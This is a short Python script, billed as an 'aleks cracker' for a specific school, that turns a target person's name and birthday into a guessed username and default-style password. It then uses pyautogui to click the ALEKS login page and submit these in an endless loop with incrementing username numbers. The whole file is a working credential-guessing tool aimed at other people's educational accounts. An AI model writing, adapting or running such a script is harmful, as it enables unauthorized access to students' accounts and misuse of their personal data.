import time
import os
import pyautogui
from pynput import keyboard


#pyautogui.moveTo(100,100,duration=0.5)

#this is a bad script wich has more printing than script
print()
print("aleks cracker for woodland mid 2021-2022 by RafiDEV")
print()
print("type the persons first name all caps")
name1 = input(": ")

print("type the persons last name all caps")
name2 = input(": ")

print("type the persons birth day: MMDDYYYY no commas spaces ect")
bday = input(": ")
# the had math at work

Sname1 = name1[:1]
pw = bday + "W"
Uname = Sname1 + name2

print()
print("the user name might be:")

print(Sname1 + name2 + "(random number)")

print()
print("the pasword is: " + pw)

print("move your mouse over the login button in aleks login page")
input("press enter to continue")
print("5")
time.sleep(1)

print("4")
time.sleep(1)

print("3")
time.sleep(1)

print("2")
time.sleep(1)

print("1")
time.sleep(1)


login = pyautogui.position()
print("your maouse is at: ")
print(pyautogui.position())


print("move your mouse over the username text box in aleks login page")
input("press enter to continue")
print("5")
time.sleep(1)

print("4")
time.sleep(1)

print("3")
time.sleep(1)

print("2")
time.sleep(1)

print("1")
time.sleep(1)


user = pyautogui.position()
print("your maouse is at: ")
print(pyautogui.position())

print("move your mouse over the password text box in aleks login page")
input("press enter to continue")
print("5")
time.sleep(1)

print("4")
time.sleep(1)

print("3")
time.sleep(1)

print("2")
time.sleep(1)

print("1")
time.sleep(1)


ppw = pyautogui.position()
print("your maouse is at: ")
print(pyautogui.position())

#the spaming
n = 0
while True:
    n = n + 1
    pyautogui.moveTo(ppw)
    pyautogui.click()
    pyautogui.write(pw)

    pyautogui.moveTo(user)
    pyautogui.click()
    pyautogui.write(Uname + str(n))

    pyautogui.moveTo(login)
    pyautogui.click()
    time.sleep(0.2)
    pyautogui.click()

    time.sleep(3)

